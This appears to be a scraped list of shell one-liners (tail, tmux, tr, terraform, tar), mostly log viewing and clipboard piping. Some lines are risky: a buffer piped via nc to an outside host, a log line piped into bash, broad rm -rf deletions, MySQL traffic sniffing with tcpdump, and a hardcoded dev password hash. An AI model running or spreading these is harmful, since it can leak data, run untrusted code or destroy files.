trans authenticate username:dev passwd:da39a3ee5e6b4b0d3255bfef95601890afd80709 remote_addr:127.0.0.1 | grep token
track -ca weight | jp -input csv -height 25 -width 67 -canvas braille
trace | grep link
tr [a-f] [A-F] | awk ' { printf
tr ACGT TGCA | rev
tr -s ' '| cut -d ' ' -f
tr -s ' ' | cut -d ' ' -f
tr -dc a-km-np-zA-HJ-NP-Z2-9 < /dev/urandom 2>/dev/null | head -c 16 ; echo
tr -dc 'a-zA-Z0-9' < /dev/urandom | head -c
tr -dc '[:xdigit:]' < /dev/urandom | trim ; \
tr -dc '[:upper:]' < /dev/urandom | trim ; \
tr -dc '[:print:]' | od -c
tr -dc '[:graph:]' < /dev/urandom | trim"
tr -dc '[:digit:]' < /dev/urandom | trim ; \
tr -dc '[:alnum:]' < /dev/urandom | trim ; \
tr -d -c 'a-zA-Z0-9!@#$%^&*()' < /dev/urandom | head -c 18; echo
tr -d '\r' | tr -d '\n'
tr -d '\n'|pbcopy
tr -d '\n' |pbcopy
tr -d '\n' | xsel -ib
tr -d '\n' | xsel -i -b
tr -d '\n' | xsel --clipboard --input
tr -d '\n' | xsel --clipboard
tr -d '\n' | xclip -selection primary
tr -d '\n' | xclip -selection clipboard -i
tr -d '\n' | xclip -selection clipboard
tr -d '\n' | xclip -sel clip
tr -d '\n' | xclip -i
tr -d '\n' | xclip
tr -d '\n' | setclip
tr -d '\n' | pbcopy -Prefer txt
tr -d '\n' | pbcopy
tr -d '\n' | clip.exe
tr -d '\n' | clip
tr -d '\n' | c
tr -d '\n' | \
tr -d '\n' | /usr/bin/pbcopy
tr -d '\n$' | pbcopy
tr -d '\\n' | xclip -selection clipboard
tr -d '\\n' | wl-copy
tr -d '\\n' | pbcopy
tr -d '\\\x' | xxd -r -p
tr -d ' \n\t' | tr [:lower:] [:upper:]; echo 1>&2
tr -cd '\12\40-\176' | a2ps --columns=1 --font='12' --portrait
tr -cd '[:alnum:]' < /dev/urandom | head -c 12
tr '\t' '\n' | nl
tr '\n' '\0'| xargs -0
tr '\n' '\0' | xargs -0 -n1
tr '\n' '\0' | xargs -0
tr '\n' ' ' | xclip -selection c
tr '\n' ' ' | sed 's/$/\n/'
tr '\n' ' ' | sed 's/$//'
tr '\012' : | sed 's/:$//'
tr '\' '/' | xargs -I {} echo 'smb:'{}
tr '[:upper:]' '[:lower:]' | tr ' ' '_'
tr ':' '\n' <<< $PATH | nl
tr ' ' '\n' | awk '{print; total+=\$1}END{print total}'
tr % = | nkf -WwmQ
tput smglr|base64
tput sc; tput home; seq 8 8 80 | sed -n
tput cup $(stty size|awk
touch index.html && mkdir css js images && touch css/master.css | mvim .
torpid | xargs kill -9
top | peco
top | grep mongod
top -p \$(ps -ef | grep \
top -p $(pidof $1 | tr
top -l1 | grep PhysMem
top -l1 -s0 | head -n 11
top -l 1 | grep PhysMem
top -l 1 | grep Phys
top -l 1 | ag Phys
top -l 1 -s 0 | grep PhysMem:
top -l 1 -s 0 | grep PhysMem
top -l 1 -o rsize | head -20
top -l 1 -n 0 | grep -e PhysMem -e unused
top -bn1 | grep
top -b | head -n 30
top -b | head -n 10
top -b | grep
top -b -o +%MEM | head -n 22
top -b -o +%MEM | head -n 17
top -b -o +%CPU | head -n 22
top -b -o +%CPU | head -n 17
top -b -n1 | head -n 5
top -b -n 1 | head -15
top -b -n 1 | grep fnguyen
top -b -n 1 | grep -i
top -b -n 1 | grep ${USER}
top -b -n 1 | awk 'NR > 7 {a[\$2]+=\$9;}END{for (i in a) if ( a[i] != 0 ) print i\
top -b -n 1 | awk 'NR > 7 {a[\$2]+=\$10;}END{for (i in a) if ( a[i] != 0 ) print i\
top -S|head -12
top -R -F -s 10 -o rsize | less
top -1 -o RES | head -20
tools/scribereader -e dev api_analytics --tail | ~/lib/jsonq/jsonq '.analytics[*].iri'
token=$(trans authenticate username:dev passwd:da39a3ee5e6b4b0d3255bfef95601890afd80709 remote_addr:127.0.0.1 | grep token) && trans nb_tool_copy_to_database_production deploy_id:1 remote_addr:127.0.0.1 $token
token=$(trans authenticate username:dev passwd:da39a3ee5e6b4b0d3255bfef95601890afd80709 remote_addr:127.0.0.1 | grep token) && trans nb_tool_copy_to_bconf_production deploy_id:1 remote_addr:127.0.0.1 $token
token=$(trans authenticate username:dev passwd:da39a3ee5e6b4b0d3255bfef95601890afd80709 remote_addr:127.0.0.1 | grep token) && trans nb_tool_copy_from_production remote_addr:127.0.0.1 $token
toilet | lolcat
toilet -t -d ~/files/fonts/figlet/ -f slant $(date) | lolcat
toilet -f rusto svbtext | lolcat
toilet -f mono12 -F rainbow 'philip' | ponythink -f winona
toilet -f mono12 -F rainbow 'fabiano' | ponythink -f winona
toilet -f mono12 -F rainbow 'andrea' | ponythink -f winona
toilet -f larry3d svbtext | lolcat
toilet -f bloody svbtext | lolcat
todotxt ls | grep @work
todos | wc -l
todo | grep @work
todo list +ACTIVE | head -n +5
todo --force-colour -A|less -r
today | xargs nvim
today | pbcopy
tmuxinator start project workspace=$(ghq list -p | peco)
tmuxifier ls | grep -i
tmux start \; source-file ~/.tmux/$(ls -A1 ~/.tmux | peco)
tmux showb | pbcopy
tmux showb | clip
tmux show-options -g | grep history-limit
tmux show-environment | sed 's/^\([^-].*=\)\(.*\)/export \1\
tmux show-buffer|xsel
tmux show-buffer |xsel -bi
tmux show-buffer |xclip -selection clipboard
tmux show-buffer |pbcopy
tmux show-buffer | xsel -pb
tmux show-buffer | xclip -selection clipboard -i
tmux show-buffer | xclip -selection clipboard
tmux show-buffer | xclip -sel clip -i
tmux show-buffer | xclip -sel clip
tmux show-buffer | xclip -i -selection clipboard
tmux show-buffer | xclip -i
tmux show-buffer | xclip
tmux show-buffer | xc
tmux show-buffer | x.copy
tmux show-buffer | remoteclip
tmux show-buffer | reattach-to-user-namespace pbcopy
tmux show-buffer | pbcopy
tmux show-buffer | clipcopy
tmux show-buffer | cb
tmux show-buffer | c
tmux show-buffer | DISPLAY=:0 xsel -b
tmux show-buffer -- | xclip -i -selection clipboard
tmux send-keys '!-2 | less' Enter Enter
tmux saveb -|pbcopy && tmux deleteb
tmux saveb -|pbcopy
tmux saveb - | x.copy
tmux saveb - | ssend --title 'clipboard' > /dev/null
tmux saveb - | reattach-to-user-namespace pbcopy
tmux saveb - | pbcopy
tmux saveb - | linux_nc_paste_to_remote_clipboard
tmux save-buffer -|pbcopy
tmux save-buffer - |c
tmux save-buffer - | xsel --clipboard --input
tmux save-buffer - | xclip -selection clipboard &>/dev/null
tmux save-buffer - | xclip -selection clipboard
tmux save-buffer - | xclip -i -selection clipboard
tmux save-buffer - | xclip -i -sel clipboard
tmux save-buffer - | xclip -i
tmux save-buffer - | wgetpaste
tmux save-buffer - | ssh local pbcopy
tmux save-buffer - | srv-pbcopy
tmux save-buffer - | reattach-to-user-namespace pbcopy
tmux save-buffer - | pbcopy
tmux save - | pbcopy
tmux rename-window $(git rev-parse --show-toplevel | xargs basename)
tmux new-session -As $(basename $PWD | tr . -)
tmux new-session -A -s `shrink_path -t -l | sed s/~/!!!!/`
tmux new-session -A -s Telegram vim /tmp/a.pdb +'exe VimCmdLineStartApp() | res 10'
tmux new-session -A -s $(basename $PWD | tr . -)
tmux new-session -A -s $(basename $PWD | tr -d .)
tmux new -s $(basename $(pwd)|sed s/[^a-z0-9A-Z_]//)
tmux new -As $(basename $PWD | tr . -)
tmux ls|cut -f 1 -d ':'
tmux ls |column -t
tmux ls | sed -n -e
tmux ls | cat -n
tmux ls | awk
tmux list-sessions | sort
tmux list-sessions | grep -E -v
tmux list-sessions | column -t
tmux list-sessions -F '#{session_name}' | xargs -n 1 $HOME/.tmux/bin/save-session.bash
tmux list-sessions -F '#{session_name}' | xargs $HOME/.tmux/bin/save-session.rb
tmux list-keys | percol
tmux list-keys | less
tmux list-keys | fzf
tmux info | less -iFNQRX
tmux display -p '#S' | xargs -I{} sh -c \
tmux capturep -Jp -S 0 -E - | fpp
tmux capture-pane -t 0 -S -32768; tmux show-buffer | vim - -c 32768
tmux capture-pane -p -S - | vim -
tmux capture-pane -S -32768 -e && tmux save-buffer - | less -r +Gk
tmux capture-pane -S -32768 && tmux save-buffer - | vim - +'set nonumber' +'norm G' -R
tmux capture-pane -S -10000\; show-buffer | vim +10000 -Rc 'set ft=vimshell ts=8 nolist nonu' -c 'nmap q :q<cr>' -
tmux capture-pane -S -10000\; show-buffer | vim +10000 -Rc 'set ft=vimshell ts=8 nolist nonu' -
tmux capture-pane -S -1000000000 -e && tmux save-buffer - | less -r +Gk
tmux capture-pane -S - && tmux save-buffer - | less
tmux attach | tmux new
tmux a -t $(tmux ls -F #{session_name} | fzf)
tmux -q list-sessions|cut -f 1 -d \:
tmu new-session -A -s $(basename $PWD | tr -d .)
tme|grep -Evf ~/taillog.exclude
tme -n 1|grep puppet-agent
tmate show-messages | pbcopy
tm | head -35
tm -l | grep -v Stopped
tlist | grep zp
tla what-changed --diffs | less
title ui; ~/1m/onelife-ui; lsof -t -i tcp:4000 | xargs kill; gulp clean; npm install; npm start
title pcdlog; tail -F -n 50 ./var/log/pcd.log | sed -f ~/.vim/kjsl.sed
title otvlog; tail -F -n 50 ./var/log/opentv/current | sed -f ~/.vim/kjsl.sed
title otvlog; tail -F -n 50 ./var/log/messages | sed -f ~/.vim/kjsl.sed
title kernellog; tail -F -n 50 ./var/log/kernel | sed -f ~/.vim/kjsl.sed &
title dfblog; tail -F -n 50 ./var/log/dfb.log | sed -f ~/.vim/kjsl.sed
timestamp | xargs mkdir
time terraform destroy -force 2>&1 | tee /tmp/tf-destroy.log
time tensorflow/tools/ci_build/ci_build.sh CPU bazel test //tensorflow/python/... 2>&1 | tee test.out
time rosrun pokebot_planning heuristic.py --jfilename pokebot.json -s -v | tee /tmp/$(date +%Y%m%d_%H%M%S)
time rosrun pokebot_planning heuristic.py --jfilename multi_obj_3.json | tee /tmp/$(date +%Y%m%d_%H%M%S)
time rosrun arc_planning heuristic.py --jfilename multi_obj_3.json | tee /tmp/$(date +%Y%m%d_%H%M%S)
time rosrun arc_planning heuristic.py --jfilename arc.json -s -v | tee /tmp/$(date +%Y%m%d_%H%M%S)
time rosrun apc_planning heuristic.py --jfilename multi_obj_3.json | tee /tmp/$(date +%Y%m%d_%H%M%S)
time rosrun apc_planning heuristic.py --jfilename apc.json -s -v | tee /tmp/$(date +%Y%m%d_%H%M%S)
time openssl speed md5 sha1 sha256 sha512 des des-ede3 aes-128-cbc aes-192-cbc aes-256-cbc rsa2048 dsa2048 | tee /tmp/sslspeed`date +%Y%m%d-%H%M`
time openssl speed -multi 2 md5 sha1 sha256 sha512 des des-ede3 aes-128-cbc aes-192-cbc aes-256-cbc rsa2048 dsa2048 | tee /root/sslspeed`date +%Y%m%d-%H%M`
time mm -j8 2>&1 | tee make_mm_build.log
time m -j8 2>&1 | tee make_m_build.log
time find -mindepth 1 -maxdepth 1 -print0 | xargs -0 rm -rf
time echo '999999 99999^p' | dc > /dev/null
time (./test_repeat.sh 999 10000 2>&1 | tee test_999.log)
time (./test_repeat.sh 800 10000 2>&1 | tee test_800.log)
time (./test_repeat.sh 777 10000 2>&1 | tee test_777.log)
time (./test_repeat.sh 3000 10000 2>&1 | tee test_3000.log)
time (./test_repeat.sh 2031 10000 2>&1 | tee test_2031.log)
time (./test_repeat.sh 2030 10000 2>&1 | tee test_2030.log)
time (./test_repeat.sh 2020 10000 2>&1 | tee test_2020.log)
time (./test_repeat.sh 2019 10000 2>&1 | tee test_2019.log)
time (./test_repeat.sh 2017 10000 2>&1 | tee test_2017.log)
time (./test_repeat.sh 2016 10000 2>&1 | tee test_2016.log)
time (./test_repeat.sh 2015 10000 2>&1 | tee test_2015.log)
time (./test_repeat.sh 2014 10000 2>&1 | tee test_2014.log)
time (./test_repeat.sh 2013 10000 2>&1 | tee test_2013.log)
time (./test_repeat.sh 2012 10000 2>&1 | tee test_2012.log)
time (./test_repeat.sh 2011 10000 2>&1 | tee test_2011.log)
time (./test_repeat.sh 2010 10000 2>&1 | tee test_2010.log)
time (./test_repeat.sh 1300 10000 2>&1 | tee test_1300.log)
time (./test_repeat.sh 1208 10000 2>&1 | tee test_1208.log)
time (./test_repeat.sh 1207 10000 2>&1 | tee test_1207.log)
time (./test_repeat.sh 1206 10000 2>&1 | tee test_1206.log)
time (./test_repeat.sh 1205 10000 2>&1 | tee test_1205.log)
time (./test_repeat.sh 1204 10000 2>&1 | tee test_1204.log)
time (./test_repeat.sh 1203 10000 2>&1 | tee test_1203.log)
time (./test_repeat.sh 1202 10000 2>&1 | tee test_1202.log)
time (./test_repeat.sh 1201 10000 2>&1 | tee test_1201.log)
time (./test_repeat.sh 1200 10000 2>&1 | tee test_1200.log)
time (./test_repeat.sh 1007 10000 2>&1 | tee test_1007.log)
time (./test_repeat.sh 1006 10000 2>&1 | tee test_1006.log)
time (./test_repeat.sh 022 10000 2>&1 | tee test_022.log)
time (./test_repeat.sh 020 10000 2>&1 | tee test_020.log)
time (./test_repeat.sh 019 10000 2>&1 | tee test_019.log)
time (./test_repeat.sh 018 10000 2>&1 | tee test_018.log)
time (./test_repeat.sh 017 10000 2>&1 | tee test_017.log)
time (./test_repeat.sh 016 10000 2>&1 | tee test_016.log)
time (./test_repeat.sh 015 10000 2>&1 | tee test_015.log)
time (./test_repeat.sh 014 10000 2>&1 | tee test_014.log)
time (./test_repeat.sh 013 10000 2>&1 | tee test_013.log)
time (./test_repeat.sh 012 10000 2>&1 | tee test_012.log)
time (./test_repeat.sh 011 10000 2>&1 | tee test_011.log)
time (./test_repeat.sh 010 10000 2>&1 | tee test_010.log)
time (./test_repeat.sh 009 10000 2>&1 | tee test_009.log)
time (./test_repeat.sh 008 10000 2>&1 | tee test_008.log)
time (./test_repeat.sh 007 10000 2>&1 | tee test_007.log)
time (./test_repeat.sh 006 10000 2>&1 | tee test_006.log)
time (./test_repeat.sh 005 10000 2>&1 | tee test_005.log)
time (./test_repeat.sh 004 10000 2>&1 | tee test_004.log)
time (./test_repeat.sh 003 10000 2>&1 | tee test_003.log)
time (./test_repeat.sh 002 10000 2>&1 | tee test_002.log)
time (./test_repeat.sh 001 10000 2>&1 | tee test_001.log)
time (./test_repeat.sh 000 10000 2>&1 | tee test_000.log)
time (./test_all_repeat.sh 10000 2>&1 | tee test_all.log)
thunar | pwd
thor -T | grep
things.sh today | wc -l
things.sh inbox | wc -l
theme open | grep -o 'https*://[^\
th | tr \
tg summary --graphviz | dot -Txlib
tfs | xargs git rm
tf | head
tf validate && tf fmt && tf plan -out=tfplan | landscape
textutil -format html -convert rtf -stdin -stdout | pbcopy -Prefer rtf
textfiles | xargs sed -i '' 's/ / /g'
textfiles | xargs sed -i '' 's/ *$//g'
text2wave <(cat -) | ffplay -nodisp -autoexit -
texfind | xargs latexmk -pvc
test-server.sh | grep ^FAIL
test -z $NO_UNICODE && (echo -e $'\u1F3B7' | grep -v F3B7) &> /dev/null
test -d CVS && find ./ -type d -name CVS | xargs rm -rfv
test -d .svn && find ./ -type d -name .svn | xargs rm -rfv
terragrunt state pull | less
terraform workspace list | sed -n -E 's/^\* (.*)$/\1/p'
terraform validate . && terraform plan 2>&1 | tee /tmp/tf-plan.log
terraform state pull | less
terraform show |less
terraform plan | landscape
terraform plan -no-color -out plan.plan |& tee plan.txt
terraform plan -destroy 2>&1 | tee /tmp/tf-plan-destroy.log
terraform output | ini
terraform graph | dot -Tsvg > tmp/graph.svg && open -a 'Firefox.app' tmp/graph.svg
terraform graph | dot -Tps -o graph.ps
terraform graph | dot -Tpng > graph.png
terraform graph | dot -Tpng > /tmp/graph.png && xdg-open /tmp/graph.png
terraform apply | landscape
terr | grep
termux-contact-list | jq
termux-battery-status|sed -n 's/\
termux-battery-status | jq '\
termcolors | less
tempfun() { /projects/hnd/tools/linux/bin/iperf -i 1 -f m -w 2M -u -c $1 -b 1200M -t 10000 | grep -v ID; }; tempfun $@
tempfun() { /projects/hnd/tools/linux/bin/iperf -i 1 -f m -w 2M -c $1 -t 10000| grep -v ID; }; tempfun $@
temp=`find . -iname *.app`; idevice_id -l | xargs -I {} ios-deploy -b $temp -i {}
temp && date +'%Y%m%d_%H%M%S_temp.txt' | xargs -I {} touch ./{}
telnet towel.blinkenlights.nl 666 2>/dev/null |tail -2
telnet otih-oith.us.to 2222 | awk '{print $21}'
telnet bofh.jeffballard.us 666 2>/dev/null | tail -1
teleport | grep -i
tee | pbcopy
tee `tty` | xclip -selection clipboard
tee `tty` | xclip
tee >(xsel --input --primary) | xsel --input --clipboard
tee >(xclip -i -sel c -f | xclip -i -sel p)
tee >(grep Frequencies | awk '{OFS=\
tee /tmp/paste && cat /tmp/paste | nc virtualhacker.net 9999
tee /dev/tty|xclip -selection clipboard
tee /dev/tty|xclip --selection clipboard
tee /dev/tty| xclip -selection clipboard
tee /dev/tty | xclip -selection c
tee /dev/tty | xargs -n 1 -d '\n' -- notify-send -i stock_dialog-warning
tee /dev/tty | pbcopy
tee /dev/tty | awk
tee /dev/stderr | xclip -sel clip
tcpdump -i lo -s 0 -l -w - dst port 3306 | strings
tcpdump -i any -n -s 0 -w - | grep -a -o -E \
tc | wc -l
taskrunner `taskrunner --list | fzf`
task | head -n 1
task | grep -i -C 4
task tom | grep `pwd`
task sync 2>&1| grep 'caca de vaca' ; task
task rc._forcecolor:on +LATEST info | less
task projects rc.list.all.projects=yes 2>/dev/null | grep -E '^\w'
task due.after:now-7days list | head -4; echo ' '
targett |more
tar zcvf mine.tar.gz ~/* | cp /media/*/*/Linux*/mine.tar.gz
tar uPvf ~/backup-`lsb_release -r | cut -f 2`.tar /var/cache/apt/archives --exclude=/var/cache/apt/archivesa/partial/* --exclude=/var/cache/apt/archives/lock
tar cvf - . | ( cd \!* ; tar xvf - )
tar cf - \!* | gzip -9 > \!*.tar.z
tar cf - \!* | compress > \!*.tar.Z
tar cf - ./ | sha256sum
tar cf - . | (cd /path/to/target/dir && tar -vxpf -)
tar cf - -C fromdir fromfiles | tar xvpRf -
tar cf - $* | (pushd; tar xvf - )
tar -ztvf xxx.tar.gz |grep yyyy
tar -tvf $@ | tarcolor
tar -tf $(npm pack | tail -1)
tar -czf - err.txt generated.file succ.txt | openssl enc -e -pbkdf2 -out
tar -cvzp $HOME | gpg -co machine-$(date +%F).tar.gz.gpg
tar -c $* | lzma -c9 > $1.tar.lzma
tar --help | less
tailf /var/log/secure | ccze
tailf /var/log/httpd/php.log | ccze -A -p php
tailf /var/log/hhvm/hhvm.log | ccze -A -p php
tail `ls -A1t | head -1`
tail `ls -1t | head -1`
tail /var/log/mail.* | ccze -A
tail -v `ls -t|head -n2`
tail -v `ls -t|head -n1`
tail -s 0.5 -f /var/log/squid/access.log | awk '{ printf strftime(\
tail -qFn0 /var/log/symform/apache-access* | ${SYMROOT}/config/ops/apache_stats.rb -watch rate /tmp/stats-${SYMUSER}.yml
tail -q -f /var/log/valhalla/*.log | grep -v /healthcheck
tail -n60 -f ~/java/tomcat-8/logs/catalina.out | rainbow -f catalina
tail -n1|sed -e "
tail -n100 -f `ls -ahrtc ~/lich/logs/GSIV-Jovalon/loresing-* | tail -n1`
tail -n1 ~/.system-install-steps-log | bash
tail -n0 -F /var/log/nginx/$(pwd | cut -d/ -f5).access.log
tail -n0 -F /var/log/apache2/staging-$(pwd|cut -d/ -f5).error.log
tail -n0 -F /var/log/apache2/staging-$(pwd|cut -d/ -f5).access.log
tail -n0 -F /var/log/apache2/$(pwd|cut -d/ -f5).error.log
tail -n0 -F /var/log/apache2/$(pwd|cut -d/ -f5).access.log
tail -n 60 /var/log/$SYSLOG|more
tail -n 50 rsl.* | less
tail -n 50 /var/log/messages | grep sendmail
tail -n 50 /var/log/messages | grep pop3d
tail -n 50 /var/log/docker/$HOSTNAME/$ENVIRONMENT/$APPLICATION/python/* | jq -r .message
tail -n 50 /var/log/docker/$HOSTNAME/$ENVIRONMENT/$APPLICATION/python/* | jq -r
tail -n 40 ~/life/work.md | less
tail -n 40 ~/life/note.md | less
tail -n 300 $HOME/.flexget/flexget.log | less
tail -n 300 $HOME/.flexget/flexget-sorting.log | less
tail -n 30 -f /var/log/errors.log | ccze -A
tail -n 30 -f /var/log/Xorg.0.log | ccze -A
tail -n 120 /var/log/$SYSLOG|more
tail -n 1000000 /var/log/syslog | grep
tail -n 1000000 ${STARDOCK_LOGS}/stardock.log | grep
tail -n 10000 $HISTFILE | grep
tail -n 1000 | less /var/log/dpkg.log
tail -n 1000 log/development.log | less -R
tail -n 1000 /var/mail/$USER | less -S
tail -n 1000 /srv/hyrax/logs/development.log | grep FATAL -A 20 -B 20
tail -n 10 -F /var/log/apache2/access.log | awk -F\
tail -n 1 | pbcopy
tail -n 1 error.log | underscore pretty
tail -n 0 -f /var/log/httpd/*log | awk '{print \$9}'
tail -n +6 ~/.bash_profile | less
tail -n +2 | tr -d '\n'
tail -n +2 $1 | ruby -c
tail -n +1 | less
tail -n $(usable_lines) $e | clog
tail -n $(( LINES - 2 err.txt generated.file succ.txt $(print ${PROMPT} |wc -l) ))
tail -fn100 hotel*.log | ~/ATGLogColorizer
tail -fn100 gc.log.*.current | ~/ATGLogColorizer
tail -fn 500 /var/log/syslog | lwatch -i-
tail -fn 500 /var/log/mysql/mysql.log | lwatch -i-
tail -fn 500 /var/log/mail.log | lwatch -i-
tail -fn 500 /var/log/auth.log | lwatch -i-
tail -fn 500 /var/log/apache2/error.log | lwatch -i-
tail -fn 1000 <file> | grep <filter>
tail -fn -1000 $FUSE_HOME/data/log/fuse.log | sed 's#WARN#\x1b[33m&#; s#ERROR#\x1b[31m&#; s#foo#\x1b[32m&#'
tail -f ~/logs/error_log | pretty
tail -f ~/logs/$LOG_NAME2 | pretty
tail -f ~/logs/$LOG_NAME | pretty
tail -f ~/logs/$ALOG_NAME2 | pretty
tail -f ~/logs/$ALOG_NAME | pretty
tail -f ~/jboss/server/trafigura/log/server.log | ~/code/alfie/scripts/rabbit-events
tail -f ~/Mail/.maillog |colorize
tail -f ~/Mail/.maillog /var/log/mail | colorize &
tail -f ~/.xsession-errors | ccze -A
tail -f ~/.pry_history | grep -v 'exit'
tail -f ~/.dwmlog | ccze -A
tail -f logs/bot.log | $log_color
tail -f logs/apperror.log | tools/pretty_error_log
tail -f logs/api.log | $log_color
tail -f log/test.log | grep DEBUG
tail -f log/test.log | ack AJ
tail -f log/jl/application.log |grep $i
tail -f log/error.log | grep '>>>'
tail -f log/development.log | grep web_service_request
tail -f log/development.log | grep DEBUG
tail -f log/development.log | grep -vE \
tail -f log/development.log | grep -e Processing -e Rendered -e Completed -e Rendering
tail -f log/development.log | ag -A 2 -Q '**********'
tail -f log/development.log | ack AJ
tail -f log/* | grep DEBUG
tail -f log/$(echo ${RAILS_ENV:-development} | tr '[:upper:]' '[:lower:]').log
tail -f leakedmem.bin | xxd -c 32 -g 32
tail -f leakedmem.bin | strings
tail -f app/storage/logs/`ls -1rt app/storage/logs/ | tail -1`
tail -f `ls -trC1 /opt/ptc/windchill/logs/MethodServer*.log | tail -1`
tail -f `ls -trC1 /opt/ptc/windchill/logs/BackgroundMethodServer*.log | tail -1`
tail -f `ls -trC1 /opt/ptc/tomcat/logs/localhost_PDM* | tail -1`
tail -f `ls -tr1|tail -1`
tail -f `ls -tr | tail -1`
tail -f `ls -tr $*|tail -1`
tail -f `ls -t1 | head -n1`
tail -f `ls -rt1 | tail -n1`
tail -f `ls -rt zone_svr_20*.log | tail -1`
tail -f `ls -rt rundata*.log | tail -1`
tail -f `ls -rt *.error | tail -1`
tail -f `ls -A1t | head -1`
tail -f `ls -1td ./storage/logs/*| /usr/bin/head -n1`
tail -f `ls -1t | head -1`
tail -f `ls -1t **/*stamped* | head -1`
tail -f \`ls -lrt | perl -e '@t=<STDIN>; print STDOUT (\$t[\$#t] =~ m:(\S+)$:)[0]' \`
tail -f /workspace/vcassen/TACO/logs/t1dbase-error_log | /users/vcassen/bin/filter_logs
tail -f /var/log/user.log | ccze -A
tail -f /var/log/system.log|grep Sketch
tail -f /var/log/system.log | ccze -A
tail -f /var/log/syslog | grep openaps
tail -f /var/log/syslog | grep CRON
tail -f /var/log/syslog | ccze -A
tail -f /var/log/syslog | ccze
tail -f /var/log/ses/service/apigateway.log | jsonlogviewer -L
tail -f /var/log/nginx/access.log | ccze --mode ansi
tail -f /var/log/nginx/access.log /var/log/nginx/error.log | ccze
tail -f /var/log/nginx/access.log /var/log/nginx/error.log | grep -iv NewRelicPinger
tail -f /var/log/named/learnflix_stats.log |ccze
tail -f /var/log/named/bind.log |ccze
tail -f /var/log/named/bind-queries.log|ccze
tail -f /var/log/moogsoft/moogfarmd.log | ccze -m ansi
tail -f /var/log/messages | grep isakmpd
tail -f /var/log/messages | grep --line-buffered cloud-init
tail -f /var/log/messages | ccze -c ansi
tail -f /var/log/messages | ccze --mode ansi
tail -f /var/log/messages | ccze - mode ansi
tail -f /var/log/maillog | ccze --mode ansi
tail -f /var/log/mail.log|ccze -A
tail -f /var/log/mail.log |ccze
tail -f /var/log/lastfm/lastfm.log | ccze -A
tail -f /var/log/httpd/error_log | grep -v connectiontest.txt
tail -f /var/log/httpd/access_log | grep -v connectiontest.txt
tail -f /var/log/apache2/error_log | sed 's/\\\\n/\\n/g'
tail -f /var/log/apache2/error.log |ccze
tail -f /var/log/apache2/error.log | sed s/$/\\n/
tail -f /var/log/apache2/error.log | fold
tail -f /var/log/apache2/error.log | ccze -A
tail -f /var/log/apache2/error.log | ccze
tail -f /var/log/apache2/access.log |ccze
tail -f /var/log/apache2/access.log | ccze -A
tail -f /var/log/apache2/access.log | ccze
tail -f /var/log/all.log |ccze
tail -f /usr/local/var/postgres/pg_log/$(ls -tr /usr/local/var/postgres/pg_log | tail -1)
tail -f /usr/local/apache/logs/error_log | pretty
tail -f /tmp/install.log | sed '/^startup complete$/ q'
tail -f /tmp/cat_npm.log | grep 'built'
tail -f /private/var/log/apache2/access_log | ngxtop -f common
tail -f /opt/local/var/log/nginx/error.log /projects/odyssey/log/wiso_dev.log | color_server_log.sh
tail -f /opt/local/var/log/nginx/error.log /projects/odyssey/log/ody_dev.log | color_server_log.sh
tail -f /opt/local/var/log/nginx/error.log /projects/odyssey/log/niso_dev.log | color_server_log.sh
tail -f /nestlabs/var/log/nlclient | grep $@
tail -f /home/y/logs/yapache/access | /home/y/bin/readlog
tail -f /home/pi/.wisebot/logs/torage-tunnel.log | jq .
tail -f /home/pi/.wisebot/logs/storage.log | jq .
tail -f /home/pi/.wisebot/logs/storage-tunnel.log | jq .
tail -f /home/pi/.wisebot/logs/ssh-tunnel.log | jq .
tail -f /home/pi/.wisebot/logs/script.log | jq .
tail -f /home/pi/.wisebot/logs/operator.log | jq .
tail -f /home/pi/.wisebot/logs/network-operator.log | jq .
tail -f /home/pi/.wisebot/logs/led.log | jq .
tail -f /home/pi/.wisebot/logs/core.log | jq .
tail -f /home/pi/.wisebot/logs/button.log | jq .
tail -f /home/pi/.wisebot/logs/ble.log | jq .
tail -f /etc/openvpn/openvpn-status.log | ccze
tail -f /etc/httpd/logs/*error* | sed 's/\\\\n/\\n/g'
tail -f .kitchen/logs/*.log | ccze -A
tail -f ./log/test.log | grep --invert-match DEBUG
tail -f ./log/development.log | grep --invert-match DEBUG
tail -f -n100 /var/log/suricata/eve.json| jq
tail -f -n 5000 /Users/HelixServer/inventoryScanner/logFiles/scanServer.err.log | grep ECONNRESET
tail -f -n 50 `ls -t .| head -1`
tail -f -n 300 /usr/local/smarthome/var/log/smarthome-develop.log | colorize green '.*INFO.*' yellow '.*WARNING.*' purple '.*ERROR.*' purple '.*FAIL.*'
tail -f -n 300 /usr/local/smarthome/var/log/smarthome-details.log | colorize green '.*INFO.*' yellow '.*WARNING.*' purple '.*ERROR.*' purple '.*FAIL.*'
tail -f -n 20 $lpLoggingDir/lightningClover.log | bunyan
tail -f -n 20 $loggingDir/operation.log | bunyan
tail -f -n 20 $clLoggingDir/lightningClover.log | bunyan
tail -f -n 10000 /opt/liferay/tomcat/logs/catalina.out | sed --unbuffered -e 's/\(INFO\)/\o033[32m\1\o033[39m/' -e 's/\(SEVERE\)/\o033[31m\1\o033[39m/' -e 's/\(ERROR\)/\o033[31m\1\o033[39m/' -e 's/\(WARN\)/\o033[33m\1\o033[39m/' -e 's/\(DEBUG\)/\o033[34m\1\o033[39m/'
tail -f -n 1000 /var/log/syslog | grep vpn
tail -f -n 1000 /var/log/syslog | grep CRON
tail -f -n 1000 /usr/local/smarthome/var/log/smarthome-warnings.log | colorize green '.*INFO.*' yellow '.*WARNING.*' purple '.*ERROR.*' purple '.*FAIL.*'
tail -f --ilines=10000000000000000000000000000 $HOME/.zsh_history | grep pacman
tail -f $lpLoggingDir/lightningClover.log | bunyan
tail -f $clLoggingDir/lightningClover.log | bunyan
tail -f $SPLUNK_HOME/var/log/splunk/splunkd.log | grep -v INFO
tail -f $HOME/.irssi_pipe | dzen2 -l 6 -tw 300
tail -f $1 | sed 's/\\\n/^M^F/g'
tail -f $1 | more
tail -f $(ls -t err.txt generated.file succ.txt | head -n 1)
tail -f $(ls -1t | head -1)
tail -f #{ARGV[0]} | ruby -p -rYAML -e '$_.gsub!(/(?<=Parameters:) (.+)/) { $1 + \
tail -`expr $LINES - 1` $SITELOG | less -S +G
tail -F /var/qmail-mx/log/qmail-smtpd/current | tai64nlocal
tail -F /var/qmail-mx/log/qmail-send/current | tai64nlocal
tail -F /var/log/syslog|ccze -A
tail -F /var/log/syslog | allfilter
tail -F /var/log/spamd/current| djbdns-log.py
tail -F /var/log/qmail/qmailsepo-send/current | tai64nlocal
tail -F /var/log/qmail/qmail-smtpd/current | tai64nlocal
tail -F /var/log/qmail/qmail-send/current | tai64nlocal
tail -F /var/log/qmail/qmail-qmqpd/current| djbdns-log.py
